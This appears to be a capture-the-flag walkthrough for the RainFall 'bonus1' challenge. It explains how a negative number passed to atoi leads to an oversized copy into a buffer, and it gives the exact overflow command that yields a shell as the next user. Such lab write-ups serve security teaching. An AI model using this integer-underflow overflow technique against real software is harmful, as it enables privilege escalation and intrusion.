
# Walkthrough

## Disassembling the executable

see source.c

## Exploit

The program expects two arguments, an number and a string. The number is converted into an integer with atoi.

The n character of the string is copied into a buffer.

(Underflow): We exploited the absence of check of the return value to allocate more than 9 bytes.

This way we can write over the number 'ret' to match the comparison. We get a shell.


```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c "print('A' * 40 + '\x46\x4c\x4f\x57')")
$ whoami
bonus2
```
